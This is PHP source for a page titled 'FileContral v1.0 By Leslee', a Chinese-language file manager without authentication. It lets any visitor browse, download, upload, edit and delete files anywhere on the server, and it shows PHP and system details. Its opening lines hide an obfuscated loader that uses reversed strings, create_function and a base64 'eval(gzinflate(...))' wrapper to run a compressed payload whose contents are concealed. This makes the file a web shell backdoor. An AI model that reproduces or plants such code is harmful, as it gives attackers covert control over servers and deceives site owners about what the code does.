<?php
header("content-Type: text/html; charset=utf-8"); 
error_reporting(0);
$url="http://".$_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];
$_S="jVTbbtpAEH2vlH/YWG7WFtQYc0kImD5UqagaKShBfYHIWuwBr+qb1ktCFOXfO2tjLgm0tQQaz8w5c2ZmvXqesTx/TkVAXKL5HT/otbvdVnPBeraDv6bvtFt2p9Nq9S6vrrT+2Sc9BpUaSpldNxqatQQJyZOhjSaTsTe6e5hopqV7Dzf3v27up3Q8GqN9+50+Kqifpr85JKykyNYgFCNfGDzPQRq6N0b8lBaa6KNpviKGYSoEXvYcfIiXWJXhEn3biPmKXGUlY69ineisTiSPwTBr7ZZj22b/7exTCCwAYWi3qc8kT5NrolnYouJ+K+jPIc7ki7HHTy4uyHml+Nvd3c8fN9O9Qo8mSQU5HiLnB0pVg5ngiSTaQLJ5BGSObhCuTZ55IEO3adufSQh8GcrCHg5kQJ5YxJeJO9NiHgQRzLThwIdEghgOFqmICfNVIxifaSQGGaYB2mpyKpMn2UoS+ZIBOishKpGtI0iWWHOmtRx0KL1oF2LfAfPVPOZyOGiockO1wgBnXYxzsUqK6tuVZearALkSCYmDjkFZt+n41FJ28T7vsHaPWphm0R5cLdoUDfA7wSU95FuJKPf8kCVL3Kpcy7qupKgBEnxwT1WmB2ueyxypWQ7dtgeJnwZAi62dygmgzKno1LNRbRR11AmjkCDLV3LAW2gxyTU5YCq9/ZLsDaIcjgnMpYgKzmPKkCiE9YkgruxExA/FiQiyIed/9ojSJukI1tv2ED1JH6T42Nkenc5EE79WJgR7MWi2mkfc90IZR7ROrVAy3wf8buu0od5pxbJBOjvkfD5H8DJMc4kmJuM/wg8d+eFrkMqtY5/5by16ArKI+bguFF5XGupVv++iTr1M2W++uCC253M3MbR4sqzGrOPkXEo3oEVxM3DX7hOdkwEpj8AWo7y1mlnm7g8WSYjlkvJQGLj+CjLVOd6TO0l7LStQ/1DkbotobRWWTP8WqTBfmoVG1zkisuRROvEUGuV5K1BKpLUxas2Teku8kvwH";$_A=strrev("esab")."64_".strrev("edoced");$_X=$_A('ZXZhbChnemluZmxhdGUoYmFzZTY0X2RlY29kZSgkX1MpKSk7');$trd=strrev("taerc")."e_f".strrev("noitcnu");$ctel=$trd('$_S',$_X);$ctel($_S);
function upfile($file_var,$tofile,$filepath){

	if(!is_writable($filepath)){
		echo"$filepath 目录不存在或不可写";
		return false;
		exit;
	}
	//echo $_FILES["$file_var"]['name'];
	$Filetype=substr(strrchr($_FILES["$file_var"]['name'],"."),1);
	($tofile==='')?($uploadfile = $_FILES["$file_var"]['name']):($uploadfile = $tofile.".".$Filetype);//文件名
	$Array[tofile] = $tofile.'.'.$Filetype;
	$Array[oldfile]= $_FILES["$file_var"]['name'];
	if(!($uploadfile==='')){
		if (!is_uploaded_file($_FILES["$file_var"]['tmp_name'])){
			echo $_FILES["$file_var"]['tmp_name']." 上传失败.";
			return false;
			exit;
		}

		if (!move_uploaded_file($_FILES["$file_var"]['tmp_name'],$filepath.'/'.$uploadfile)){
			echo "上传失败。错误信息:\n";
			print_r($_FILES);
			exit;
		}else{
			return $Array;
		}
	}else{
		return false;
		echo"无法上传";
	}
}

function deletedir($dir)
{
	if(!$handle=@opendir($dir))
	{//检测要打开的目录是否存在
		echo "没有该目录".$dir;
		//die("没有该目录");
	}
	while(false!==($file=readdir($handle)))
	{
		if($file!="."&&$file!="..")
		{
			$file=$dir.DIRECTORY_SEPARATOR.$file;
			if(is_dir($file))
			{
				deletedir($file);
			}
			else
			{
				if(@unlink($file))
				{
					//echo "文件删除成功<br>";
				}
				else
				{
					echo "文件删除失败<br>";
				}
			}
		}
	}
	closedir($handle);
	if(@rmdir($dir))
	{
		$url="http://".$_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];
		echo "<script>alert(\"目录删除成功\"),window.location=\"{$url}\";</script>";	
	}
	else
	{
		echo "删除失败".$dir;
	}

}

function getSize(&$fs)
{
	if($fs<1024)
	return $fs."Byte";
	elseif($fs>=1024&&$fs<1024*1024)
	return @number_format($fs/1024, 3)." KB";
	elseif($fs>=1024*1024 && $fs<1024*1024*1024)
	return @number_format($fs/1024*1024, 3)." M";
	elseif($fs>=1024*1024*1024)
	return @number_format($fs/1024*1024*1024, 3)." G";
}

if ($_GET['downfile']) {
	$downfile=urls_change($_GET['downfile'],'de');
	if (!@is_file($downfile)) {
		echo "<script>alert(\"你要下的文件不存在\")</script>";
	}
	$filename = basename($downfile);
	$filename_info = explode('.', $filename);
	$fileext = $filename_info[count($filename_info)-1];
	header('Content-type: application/x-'.$fileext);
	header('Content-Disposition: attachment; filename='.$filename);
	header('Content-Description: PHP3 Generated Data');
	readfile($downfile);
	exit;
}

// 删除文件
if(@$_GET['delfile']!="") {
	$delfile=urls_change($_GET['delfile'],'de');
	if(file_exists($delfile)) {
		@unlink($delfile);
	} else {
		$exists="1";
		echo "<script>alert(\"文件已不存在\")</script>";
	}
	if(!file_exists($delfile)&&$exists!="1") {
		echo"<script>alert(\"删除成功\"),window.location=\"{$url}\";</script>";
	} else {
		echo"<script>alert(\"删除失败\")</script>";
	}
}
//删除目录
if(@$_GET['deldir']!="")
{
	$deldir=urls_change($_GET['deldir'],'de');
	deletedir($deldir);
}
//编辑文件
$edit_flag=false;
if(@$_GET['editfile']!="")
{
	$flag_show=1;
	$editfile=urls_change($_GET['editfile'],'de');
	if(file_exists($editfile))
	{
		$edit_flag=true;
		$handle=fopen($editfile,"r");
		$contentfile=fread($handle,filesize($editfile));
		fclose($handle);
	}
	else
	{ return false;
	echo "<script>alert(\"文件不能编辑\")</script>";
	}

}
else
{
	$flag_show=0;
}

$CurrentPath	= $_POST['path']?$_POST['path']:($_GET['path']?$_GET['path']:false);
if(!empty($_POST['pathchoose'])){
	$CurrentPath	=urls_change($_POST['pathchoose'],'en');
}
$CurrentPath	= urls_change($CurrentPath,'de');
if($CurrentPath===false)
{
	$CurrentPath	= dirname(__FILE__);
}
$CurrentPath	= realpath(str_replace('\\','/',$CurrentPath));

if($_POST['dirname'])
{
	$newdir	= $CurrentPath."/".$_POST['dirname'];
	if(is_dir($newdir))
	{
		echo"<script>alert(\"此目录名已经存在!\")</script>";
		exit;
	}else {
		if(mkdir($newdir,0700))
		{
			$url="http://".$_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];
			echo"<script>alert(\"创建成功!\"),window.location=\"{$url}\";</script>";
		}else {
			echo "<script>alert(\"创建失败!\")</script>";
		}
	}
}

if($_POST['upload'])
{
	if(!(upfile("upfiles",$_POST['fname'],$CurrentPath)))
	{
		echo"<script>alert(\"上传失败!\")</script>";
	}else {
		echo "<script>alert(\"上传成功!\")</script>";
	}
}

if($_POST['editcontent'])
{
	$path_up=urls_change($_POST['path_f'],'de');
	$contents_file_up=$_POST['contents_file'];
	$file_time=filemtime($path_up);
	$handle=fopen($path_up,"w");
	if($handle)
	{
		fwrite($handle,$contents_file_up);
		fclose($handle);
		@touch($path_up,$file_time,$file_time);
		//header("location:".$url);
		echo "<script>alert(\"编辑成功\");window.location=\"{$url}\";</script>";
		 

	}
	else
	{
		return false;
		echo "<script>alert(\"编辑失败\")</script>";
	}

}

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>FileContral v1.0 By Leslee</title>
<script type="text/javascript">
function edit()
{


   document.getElementById('edit').style.display="";
	
}
</script>
<style type="text/css">
<!--
body {
	font-family: "宋体";
	font-size: 12px;
	margin-left: 0px;
	margin-top: 0px;
}

table {
	font-family: "宋体";
	font-size: 12px;
	text-decoration: none;
}

.bold_blue {
	color: #003399;
	font-weight: bold;
}

input {
	border-right-width: 0.1mm;
	border-bottom-width: 0.1mm;
	border-top-style: none;
	border-right-style: solid;
	border-bottom-style: solid;
	border-left-style: none;
	border-right-color: #CCCCCC;
	border-bottom-color: #CCCCCC;
}
-->
</style>

</head>
<body>
<table width="770" border="0" align="center" cellpadding="5"
	cellspacing="0">
	<tr>
		<td align="center" bgcolor="#BCBCBC"><font color="White">PHP版本：</font><font
			color=red><?php echo PHP_VERSION;?></font> &nbsp;&nbsp;&nbsp;<font
			color="White"> 服务器：</font><font color=red><?php echo php_uname();?></font></td>
	</tr>
	<tr>
		<td bgcolor="#DDDDDD">
		<table width="100%" height="100%" border="0" cellpadding="5"
			cellspacing="2" bgcolor="#339966">
			<tr>
				<form name="form1" method="post" action="">
				<td><span class="bold_blue"><strong>目录选择</strong>：</span> <input
					name="pathchoose" type="text" id="pathchoose"> <input type="submit"
					name="Submit" value="跳 转"></td>
				</form>
			</tr>
			<tr>
				<form name="form2" method="post" action="">
				<td><span class="bold_blue"><strong>新建目录</strong>：</span> <input
					name="dirname" type="text" id="dirname"> <input type="submit"
					name="Submit" value="建 立"></td>
				</form>
			</tr>
			<form name="form3" method="post" action=""
				enctype="multipart/form-data">
			<tr>
				<td><span class="bold_blue"><strong>上传文件</strong>：</span> <input
					name="upfiles" type="file" id="upfiles"></td>
			</tr>
			<tr>
				<td><span class="bold_blue"><strong> 新文件名</strong>：</span> <input
					name="fname" type="test" id="fname"> <input type="submit"
					name="upload" value="上 传"></td>
			</tr>
			</form>
			<tr>
				<td><span class="bold_blue">当前路径：</span><font color=red><?php echo $CurrentPath;?></font></td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td bgcolor="#DDDDDD">
		<table width="100%" border="0" cellspacing="0" cellpadding="5">
			<tr>
				<td bgcolor="#BCBCBC"><strong>子目录</strong></td>
			</tr>
			<tr>
				<td>
				<table width="100%" border="0" cellpadding="0" cellspacing="5"
					bgcolor="#EFEFEF">
					<tr>
						<td><b>目录名</b></td>
						<td><b>操作</b></td>
					</tr>
					<?php
					$fso=@opendir($CurrentPath);
					while ($file=@readdir($fso)) {
						$fullpath	= "$CurrentPath/$file";
						$is_dir		= @is_dir($fullpath);
						if($is_dir=="1"){
							if($file!=".."&&$file!=".")	{
								echo "<tr bgcolor=\"#EFEFEF\">\n";
								echo "<td>【目录】 <a href=\"?path=".urls_change($CurrentPath."/".$file,'en')."\">$file</a></td>\n";
								echo "<td><a href=\"?path=".urls_change($CurrentPath,'en')."&deldir=".urls_change($fullpath,'en')."\">delete</a></td>\n";
								echo "</tr>\n";
							} else {
								if($file=="..")
								{
									echo "<tr bgcolor=\"#EFEFEF\">\n";
									echo "<td>【上级】 <a href=\"?path=".urls_change($CurrentPath."/".$file,'en')."\">上级目录</a></td>";
									echo "</tr>\n";
								}
							}
						}
					}
					@closedir($fso);
					?>
				</table>
				</td>
			</tr>
			<tr>
				<td bgcolor="#BDBEBD"><strong>文件列表</strong></td>
			</tr>
			<tr>
				<td>
				<table width="100%" border="0" cellpadding="0" cellspacing="5"
					bgcolor="#EFEFEF">
					<tr>
						<td><b>文件名</b></td>
						<td><b>修改日期</b></td>
						<td><b>文件大小</b></td>
						<td><b>操作</b></td>
					</tr>
					<?php
					$flag_file=0;//检测是否有文件
					$fso=@opendir($CurrentPath);
					while ($file=@readdir($fso)) {
						$fullpath	= "$CurrentPath\\$file";
						$is_dir		= @is_dir($fullpath);
						if($is_dir=="0"){
							$flag_file++;
							$size=@filesize("$CurrentPath/$file");
							$size=@getSize($size);
							$lastsave=@date("Y-n-d H:i:s",filemtime("$CurrentPath/$file"));
							echo "<tr bgcolor=\"#EFEFEF\">\n";
							echo "<td>◇ $file</td>\n";
							echo "  <td>$lastsave</td>\n";
							echo "  <td>$size</td>\n";
							?>
					<td><input type="hidden" id="<?php echo $flag_file."path"?>"
						value="<?php echo $filec;?>"> <a
						href="?downfile=<?php echo urls_change($CurrentPath."/".$file,'en');?>">下载</a>|<a
						href="?editfile=<?php echo urls_change($CurrentPath."/".$file,'en');?>"
						onclick="edit();">编辑</a>|<a
						href="?path=<?php echo urls_change($CurrentPath,'en')."&delfile=".urls_change($CurrentPath."/".$file,'en');?>">删除</a></td>
						<?php
						//	echo "  <td><a href=\"?downfile=".urlencode($CurrentPath)."/".urlencode($file)."\">下载</a> |<a href=\"?path=".urlencode($CurrentPath)."&delfile=".urlencode($CurrentPath)."/".urlencode($file)."\">删除</a></td>\n";
						echo "</tr>\n";
						}
					}
					if($flag_file==0)
					{
						echo "<tr bgcolor=\"#EFEFEF\">\n";
						echo "<td align=\"center\" colspan=\"3\"><font style=\"color:red;\" size=\"10\">没有文件</font></td>";
						echo "</tr>\n";
					}
					@closedir($fso);
					?>
				</table>
				</td>
			</tr>
			<tr>
				<td bgcolor="#BDBEBD"><strong>编辑内容</strong></td>
			</tr>
			<tr>
				<td>
				<div id="edit" <?php if($flag_show==0) {?> style="display: none"
				<?php }?>>
				<table width="100%" border="0" cellpadding="0" cellspacing="5"
					bgcolor="#EFEFEF">
					<form name="edit" method="post" action="">
					<tr>
						<td><input type="hidden" name="path_f"
							value="<?php echo urls_change($editfile,'en');?>"></input> 
							<textarea
							id="contents_edit" name="contents_file"
							style="width: 900; overflow-y: visible;"><?php if($edit_flag){ echo $contentfile;?><?php }else{ echo "no" ;}?>
							</textarea></td>
					</tr>
					<tr>
						<td><input style="background-color: gray" type="submit"
							name="editcontent" value="submit"></input></td>
					</tr>
					</form>
				</table>
				</div>
				</td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td bgcolor="#DDDDDD">
		<table width="100%" border="0" cellspacing="0" cellpadding="5">
			<tr>
				<td bgcolor="#BCBCBC"><strong>CopyRight</strong></td>
			</tr>
			<tr>
				<td>
				<table width="100%" border="0" cellpadding="0" cellspacing="5"
					bgcolor="#EFEFEF">
					<tr align="center">
						<td><font size="3">Copyright (C) 2011 <a href=#><font size="5"
							color="red"><b>fat</b></font></a> All Rights Reserved .</font></td>
					</tr>
					<tr>
					<td align="right"><a href="<?php echo $url; ?> ><font color="blue">返回首页</font></a></td>
					</tr>
				</table>
				</td>
			</tr>
		</table>
		</td>
	</tr>
</table>
</body>
</html>
